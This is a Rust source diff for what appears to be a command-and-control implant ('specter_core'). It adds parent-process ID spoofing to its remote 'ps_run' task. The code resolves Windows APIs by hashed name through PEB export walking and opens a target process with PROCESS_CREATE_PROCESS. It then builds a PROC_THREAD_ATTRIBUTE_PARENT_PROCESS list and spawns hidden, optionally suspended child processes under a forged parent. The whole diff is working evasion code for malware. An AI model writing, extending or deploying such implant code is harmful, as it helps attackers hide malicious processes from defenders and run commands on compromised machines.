@@ -50,6 +50,9 @@ const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
 const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
 const H_WRITE_FILE: u64 = fnv1a64(b"WriteFile");
 const H_WAIT_NAMED_PIPE_A: u64 = fnv1a64(b"WaitNamedPipeA");
+const H_INIT_PROC_THREAD_ATTRIBUTE_LIST: u64 = fnv1a64(b"InitializeProcThreadAttributeList");
+const H_UPDATE_PROC_THREAD_ATTRIBUTE: u64 = fnv1a64(b"UpdateProcThreadAttribute");
+const H_DELETE_PROC_THREAD_ATTRIBUTE_LIST: u64 = fnv1a64(b"DeleteProcThreadAttributeList");
 
 /// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
 /// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
@@ -1289,6 +1292,9 @@ const STARTF_USESHOWWINDOW: u32 = 0x1;
 const SW_HIDE: u16 = 0;
 const CREATE_SUSPENDED: u32 = 0x4;
 const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x0008_0000;
+const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x0002_0002;
+const PROCESS_CREATE_PROCESS: u32 = 0x0080;
 const STILL_ACTIVE: u32 = 259;
 /// SECURITY_ATTRIBUTES: nLength +0, bInheritHandle +4 (BOOL).
 // SECURITY_ATTRIBUTES (x64): nLength +0x00 (u32), lpSecurityDescriptor
@@ -1306,6 +1312,7 @@ pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mu
     let Task::PsRun {
         output,
         prog_state,
+        ppid,
         args_len,
         args,
     } = task
@@ -1357,6 +1364,109 @@ pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mu
     }
     let mut pi = [0u8; PI_SIZE];
 
+    // PPID spoof (COMMAND_PS_RUN_PPID, ppid != 0): the child is created with
+    // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS through a STARTUPINFOEXA, like
+    // the native's father/ppid path.
+    let mut si_ex = [0u8; SI_A_SIZE + 8];
+    let mut attr = [0u8; 0x200];
+    let mut h_parent: isize = 0;
+    let mut attr_list: *mut u8 = core::ptr::null_mut();
+    let mut creation = CREATE_NO_WINDOW | (*prog_state & CREATE_SUSPENDED);
+    if *ppid != 0 {
+        let open = peb::find_export(kernel32, H_OPEN_PROCESS);
+        let init_attr = peb::find_export(kernel32, H_INIT_PROC_THREAD_ATTRIBUTE_LIST);
+        let update_attr = peb::find_export(kernel32, H_UPDATE_PROC_THREAD_ATTRIBUTE);
+        let delete_attr = peb::find_export(kernel32, H_DELETE_PROC_THREAD_ATTRIBUTE_LIST);
+        if open.is_null() || init_attr.is_null() || update_attr.is_null() || delete_attr.is_null() {
+            error(kernel32, id, results);
+            return;
+        }
+        let open = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(u32, i32, u32) -> isize,
+        >(open as *const core::ffi::c_void);
+        let init_attr = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*mut u8, u32, u32, *mut usize) -> i32,
+        >(init_attr as *const core::ffi::c_void);
+        let update_attr = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(
+                *mut u8,
+                u32,
+                usize,
+                *mut c_void,
+                usize,
+                *mut c_void,
+                *mut usize,
+            ) -> i32,
+        >(update_attr as *const core::ffi::c_void);
+        h_parent = open(PROCESS_CREATE_PROCESS, 0, *ppid);
+        if h_parent == 0 {
+            error(kernel32, id, results);
+            return;
+        }
+        let mut al_size: usize = 0;
+        // First call sizes the list (fails with ERROR_INSUFFICIENT_BUFFER).
+        init_attr(core::ptr::null_mut(), 1, 0, &mut al_size);
+        if al_size == 0 || al_size > attr.len() {
+            if !close.is_null() {
+                (core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize) -> i32,
+                >(close as *const core::ffi::c_void))(h_parent);
+            }
+            error(kernel32, id, results);
+            return;
+        }
+        if init_attr(attr.as_mut_ptr(), 1, 0, &mut al_size) == 0 {
+            if !close.is_null() {
+                (core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize) -> i32,
+                >(close as *const core::ffi::c_void))(h_parent);
+            }
+            error(kernel32, id, results);
+            return;
+        }
+        let mut hp = h_parent;
+        if update_attr(
+            attr.as_mut_ptr(),
+            0,
+            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+            &mut hp as *mut isize as *mut c_void,
+            core::mem::size_of::<isize>(),
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        ) == 0
+        {
+            if !delete_attr.is_null() {
+                (core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(*mut u8),
+                >(delete_attr as *const core::ffi::c_void))(attr.as_mut_ptr());
+            }
+            if !close.is_null() {
+                (core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize) -> i32,
+                >(close as *const core::ffi::c_void))(h_parent);
+            }
+            error(kernel32, id, results);
+            return;
+        }
+        si_ex[..SI_A_SIZE].copy_from_slice(&si[..SI_A_SIZE]);
+        si_ex[..4].copy_from_slice(&((SI_A_SIZE + 8) as u32).to_le_bytes());
+        si_ex[SI_A_SIZE..SI_A_SIZE + 8].copy_from_slice(&(attr.as_mut_ptr() as u64).to_le_bytes());
+        attr_list = attr.as_mut_ptr();
+        creation |= EXTENDED_STARTUPINFO_PRESENT;
+    }
+    let si_ptr = if attr_list.is_null() {
+        si.as_mut_ptr()
+    } else {
+        si_ex.as_mut_ptr()
+    };
+
     let create = peb::find_export(kernel32, H_CREATE_PROCESS_A);
     if create.is_null() {
         if *output && !close.is_null() {
@@ -1387,7 +1497,6 @@ pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mu
         ) -> i32,
     >(create as *const core::ffi::c_void);
 
-    let creation = CREATE_NO_WINDOW | (*prog_state & CREATE_SUSPENDED);
     let ok = create(
         core::ptr::null(),
         cmdline.as_mut_ptr(),
@@ -1397,9 +1506,26 @@ pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mu
         creation,
         core::ptr::null(),
         core::ptr::null(),
-        si.as_mut_ptr(),
+        si_ptr,
         pi.as_mut_ptr(),
     );
+
+    // PPID spoof cleanup: attribute list + parent handle (whatever the
+    // CreateProcess result was).
+    if !attr_list.is_null() {
+        let delete_attr = peb::find_export(kernel32, H_DELETE_PROC_THREAD_ATTRIBUTE_LIST);
+        if !delete_attr.is_null() {
+            (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(*mut u8)>(
+                delete_attr as *const core::ffi::c_void,
+            ))(attr_list);
+        }
+        if !close.is_null() && h_parent != 0 {
+            (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize) -> i32,
+            >(close as *const core::ffi::c_void))(h_parent);
+        }
+    }
 
     // The write end must close in the parent whatever happens next (the
     // child owns its inherited copy).
